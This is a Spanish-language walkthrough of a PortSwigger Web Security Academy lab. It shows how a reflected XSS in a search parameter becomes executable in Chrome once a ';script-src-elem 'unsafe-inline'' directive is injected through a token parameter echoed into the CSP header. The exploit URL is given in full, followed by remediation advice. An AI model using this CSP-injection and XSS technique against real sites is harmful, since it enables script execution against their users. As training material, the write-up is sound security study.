# Reflected XSS protected by CSP, with CSP bypass

> **Plataforma:** PortSwigger Web Security Academy  
> **Categoría:** Cross-Site Scripting (XSS) — Content Security Policy (CSP)  
> **Dificultad:** Expert  
> **Navegador objetivo:** Google Chrome  
> **Herramientas:** Burp Suite / Navegador Chrome  
> **Laboratorio:** [PortSwigger Lab: Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

---

## 📌 Enunciado

La aplicación implementa una política de seguridad de contenido (**Content Security Policy - CSP**) restrictiva y contiene una vulnerabilidad de XSS reflejado en su funcionalidad de búsqueda.

**Objetivo:** Bypassear la política CSP e inyectar un payload XSS reflejado que invoque la función `alert(1)`.

> ⚠️ **Nota:** La solución esperada para este laboratorio explota un comportamiento específico de la implementación de CSP en motores basados en Chromium (Google Chrome).

---

## 🔍 Análisis y Reconocimiento

### 1. Política CSP Original de la Aplicación

Al inspeccionar las cabeceras HTTP de respuesta (`HTTP Response Headers`) devueltas por la aplicación:

```http
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

#### Análisis de directivas:
- `default-src 'self'`: Restringe la carga de recursos al mismo origen por defecto.
- `script-src 'self'`: Prohíbe la ejecución de scripts inline (`<script>...</script>` o manejadores de eventos como `onload`, `onerror`) y solo permite scripts alojados en el mismo origen.
- `report-uri /csp-report?token=`: Endpoint hacia donde el navegador enviará reportes de violaciones de la política.

### 2. El Parámetro `token` y la Inyección en Cabecera

Al navegar por la aplicación o enviar una búsqueda, se observa que la URL incluye o acepta un parámetro GET llamado `token`:
```
GET /?search=test&token=some_token HTTP/1.1
```

La respuesta del servidor refleja el valor de `token` **directamente dentro del encabezado HTTP `Content-Security-Policy`**:

```http
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=some_token
```

El servidor no sanitiza caracteres especiales de delimitación de CSP (como el punto y coma `;`) ni espacios en el valor del parámetro `token`.

---

## 🔬 Identificación de la Vulnerabilidad: Inyección de Directivas CSP

Las directivas en una cabecera CSP se separan por punto y coma (`;`).  
Al poder inyectar un `;` dentro del valor de `report-uri`, el atacante puede anexar nuevas directivas que el navegador procesará como parte de la política.

### El rol de `script-src-elem` en Google Chrome

En CSP Level 3, se introdujo la directiva granular `script-src-elem`, diseñada para controlar específicamente los elementos `<script>` (tanto inline como externos).

- En navegadores basados en **Chromium (Chrome)**: Si se especifica `script-src-elem`, esta directiva tiene mayor precedencia que `script-src` para los elementos `<script>`.
- Inyectando:
  ```
  ;script-src-elem 'unsafe-inline'
  ```
- La cabecera resultante que recibe el navegador es:
  ```http
  Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
  ```
- **Efecto en Chrome:** `script-src-elem 'unsafe-inline'` actúa como un override prioritario sobre `script-src 'self'`, habilitando la ejecución de bloques de script `<script>` inline en el DOM.

*(Nota: En navegadores como Firefox o Safari, esta sobreescritura o la forma en que parsean la inyección dentro de `report-uri` no relaja la directiva restrictiva previa, por lo que el exploit está enfocado en Chrome).*

---

## 🚀 Explotación Paso a Paso

### 1. Inyección simultánea de XSS y Bypass de CSP

El parámetro `search` refleja texto sin escapar dentro del cuerpo HTML:
```html
<h1>0 search results for '<script>alert(1)</script>'</h1>
```

Combinando ambos parámetros en la URL:
- `search`: `<script>alert(1)</script>`
- `token`: `;script-src-elem 'unsafe-inline'`

### 2. Payload Final URL-Encoded

```http
GET /?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E&token=%3Bscript-src-elem+%27unsafe-inline%27 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

O directamente en la barra de direcciones de **Google Chrome**:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

### 3. Ejecución

1. El navegador carga la página.
2. Parsea el encabezado CSP inyectado y activa `script-src-elem 'unsafe-inline'`.
3. Al encontrar el elemento `<script>alert(1)</script>` reflejado en el HTML por el parámetro `search`, lo ejecuta sin bloquearlo.
4. Aparece el diálogo emergente con el `alert(1)` y el laboratorio se marca como **SOLVED**.

---

## 💡 Conceptos Clave

1. **CSP Header Injection:** Cualquier valor controlado por el usuario que se concatene en una cabecera de seguridad HTTP sin validación de caracteres de control (`;`, `\r`, `\n`) permite redefinir o anexar directivas de seguridad.
2. **Jerarquía y granularidad en CSP Level 3:** Directivas más específicas como `script-src-elem` o `script-src-attr` toman precedencia sobre directivas generales (`script-src`, `default-src`) en implementaciones de navegadores compatibles.

---

## 🛡️ Remediación

1. **Sanitización estricta de parámetros en Headers:**
   - Validar que parámetros como tokens de reporte contengan exclusivamente caracteres alfanuméricos (`^[a-zA-Z0-9_-]+$`) antes de reflejarlos en cabeceras HTTP.
2. **Defensas en profundidad (Encoding en el Body):**
   - El XSS en `search` debe neutralizarse aplicando context-aware HTML encoding (`&lt;`, `&gt;`, `&quot;`) independientemente de si existe o no una CSP.
